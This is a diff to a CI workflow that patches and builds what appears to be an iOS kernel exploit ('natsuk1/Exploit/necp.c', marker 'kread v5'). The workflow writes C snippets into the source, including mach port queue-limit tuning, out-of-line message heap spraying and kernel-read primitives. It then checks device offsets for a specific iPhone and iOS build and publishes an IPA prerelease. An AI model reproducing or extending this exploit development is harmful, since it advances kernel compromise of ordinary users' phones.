@@ -35,7 +35,7 @@ jobs:
           set -euo pipefail
           mkdir -p /tmp/nk
 
-          cat > /tmp/nk/spray.c <<'CEOF'
+          cat > /tmp/nk/spray_port.c <<'CEOF'
           static int port_set_qlimit(mach_port_t p, mach_port_msgcount_t limit) {
               mach_port_limits_t limits;
               limits.mpl_qlimit = limit;
@@ -56,7 +56,9 @@ jobs:
               if (qr != KERN_SUCCESS) log_warn("PORT", "set_qlimit kr=%d", qr);
               return p;
           }
+          CEOF
 
+          cat > /tmp/nk/spray_fn.c <<'CEOF'
           static int ool_spray_count(mach_port_t port, const void *data, size_t sz, int n) {
               ool_send_t m;
               int ok = 0;
@@ -270,60 +272,76 @@ jobs:
               print("already patched to v5")
               sys.exit(0)
 
-          orig = s
           def rd(name):
               with open("/tmp/nk/" + name) as f:
                   return f.read().rstrip()
 
-          spray = rd("spray.c")
-          kread = rd("kread.c")
-          calib = rd("calib.c")
-          run   = rd("run.c")
+          spray_port = rd("spray_port.c")
+          spray_fn   = rd("spray_fn.c")
+          kread      = rd("kread.c")
+          calib      = rd("calib.c")
+          run        = rd("run.c")
 
-          s = re.sub(
-              r"static mach_port_t port_new\(void\) \{.*?\n\}\n",
-              spray + "\n\n", s, count=1, flags=re.DOTALL)
+          RE_PORT    = r"static mach_port_t port_new\(void\) \{.*?\n\}\n"
+          RE_SPRAY   = r"static void ool_spray\(mach_port_t port, const void \*data, size_t sz, int n\) \{.*?\n\}\n"
+          RE_KREAD   = r"static int kread_raw\(uint64_t [a-z_]+ ?, uint32_t [a-z_]+\)? \{.*?\n\}\n"
+          RE_CALIB   = r"static int calibrate_kread\(void\) \{.*?\n\}\n"
+          RE_COMBINED = r"static volatile int g_busy = 0;.*?int nk_necp_run\(void\) \{.*?\n\}\n"
+          RE_SINGLE   = r"int nk_necp_run\(void\) \{.*?\n\}\n"
 
-          s = re.sub(
-              r"static int kread_raw\(uint64_t kaddr, uint32_t len\) \{.*?\n\}\n",
-              kread + "\n\n", s, count=1, flags=re.DOTALL)
+          required = [
+              ("port_new", RE_PORT),
+              ("ool_spray", RE_SPRAY),
+              ("kread_raw", RE_KREAD),
+              ("calibrate_kread", RE_CALIB),
+          ]
+          for name, rx in required:
+              if not re.search(rx, s, flags=re.DOTALL):
+                  print("ERROR: baseline pattern '%s' not found" % name)
+                  sys.exit(1)
 
-          s = re.sub(
-              r"static int calibrate_kread\(void\) \{.*?\n\}\n",
-              calib + "\n\n", s, count=1, flags=re.DOTALL)
+          if not (re.search(RE_COMBINED, s, flags=re.DOTALL)
+                  or re.search(RE_SINGLE, s, flags=re.DOTALL)):
+              print("ERROR: nk_necp_run baseline not found")
+              sys.exit(1)
 
-          combined = re.compile(
-              r"static volatile int g_busy = 0;.*?int nk_necp_run\(void\) \{.*?\n\}\n",
-              flags=re.DOTALL)
-          single = re.compile(
-              r"int nk_necp_run\(void\) \{.*?\n\}\n",
-              flags=re.DOTALL)
-          if combined.search(s):
-              s = combined.sub(run + "\n", s, count=1)
-          elif single.search(s):
-              s = single.sub(run + "\n", s, count=1)
+          orig = s
+
+          s = re.sub(RE_PORT,  spray_port + "\n\n", s, count=1, flags=re.DOTALL)
+          s = re.sub(RE_SPRAY, spray_fn   + "\n\n", s, count=1, flags=re.DOTALL)
+          s = re.sub(RE_KREAD, kread      + "\n\n", s, count=1, flags=re.DOTALL)
+          s = re.sub(RE_CALIB, calib      + "\n\n", s, count=1, flags=re.DOTALL)
+
+          if re.search(RE_COMBINED, s, flags=re.DOTALL):
+              s = re.sub(RE_COMBINED, run + "\n", s, count=1, flags=re.DOTALL)
           else:
-              print("ERROR: nk_necp_run block not found")
+              s = re.sub(RE_SINGLE, run + "\n", s, count=1, flags=re.DOTALL)
+
+          if s == orig:
+              print("ERROR: no changes applied")
               sys.exit(1)
 
           if "natsuk1-kread-v5" not in s:
               print("ERROR: marker not inserted")
               sys.exit(1)
-          if s == orig:
-              print("ERROR: no changes applied")
-              sys.exit(1)
 
-          for pat, name in [
-              ("static volatile int g_busy = 0;", "g_busy"),
-              ("static int nk_necp_run_impl(void)", "impl"),
-              ("int nk_necp_run(void)", "run"),
-              ("static int ool_spray_count(mach_port_t", "spray_count"),
-              ("static mach_port_t port_new(void)", "port_new"),
-              ("static int port_set_qlimit(mach_port_t", "qlimit"),
-          ]:
-              c = s.count(pat)
-              if c != 1:
-                  print("ERROR: %s count=%d" % (name, c))
+          checks = [
+              ("static volatile int g_busy = 0;", 1),
+              ("static int nk_necp_run_impl(void)", 1),
+              ("int nk_necp_run(void)", 1),
+              ("static int port_set_qlimit(mach_port_t", 1),
+              ("static mach_port_t port_new(void)", 1),
+              ("static int ool_spray_count(mach_port_t", 1),
+              ("static void ool_spray(mach_port_t", 1),
+              ("static void ool_drain(mach_port_t", 1),
+              ("static void dump_buf_words(const char", 1),
+              ("static int kread_raw(uint64_t", 1),
+              ("static int calibrate_kread(void)", 1),
+          ]
+          for pat, want in checks:
+              got = s.count(pat)
+              if got != want:
+                  print("ERROR: '%s' count=%d want=%d" % (pat, got, want))
                   sys.exit(1)
 
           with open(p, "w") as f:
@@ -440,14 +458,18 @@ jobs:
           set -euo pipefail
           F=natsuk1/Exploit/necp.c
           grep -q "natsuk1-kread-v5" "$F"
-          grep -q "ool_spray_count" "$F"
           grep -q "port_set_qlimit" "$F"
           grep -q "MACH_SEND_TIMEOUT" "$F"
+          grep -q "ool_spray_count" "$F"
           grep -q "dump_buf_words" "$F"
           grep -q -e "----- attempt" "$F"
           test "$(grep -c 'static volatile int g_busy = 0;' "$F")" = "1"
           test "$(grep -c 'static int nk_necp_run_impl(void)' "$F")" = "1"
           test "$(grep -c 'int nk_necp_run(void)' "$F")" = "1"
+          test "$(grep -c 'static mach_port_t port_new(void)' "$F")" = "1"
+          test "$(grep -c 'static void ool_spray(mach_port_t' "$F")" = "1"
+          test "$(grep -c 'static void ool_drain(mach_port_t' "$F")" = "1"
+          test "$(grep -c 'static int ool_spray_count(mach_port_t' "$F")" = "1"
           python3 - <<'PYEOF'
           import json
           d = json.load(open("natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json"))
@@ -506,7 +528,7 @@ jobs:
           gh release create development natsuk1.ipa \
             --target "${GITHUB_SHA}" --title "Development" \
             --prerelease --latest=false \
-            --notes "kread v5: port qlimit bump + mach_msg send timeout"
+            --notes "kread v5: port qlimit + send timeout + preflight checks"
 
       - name: Commit
         run: |
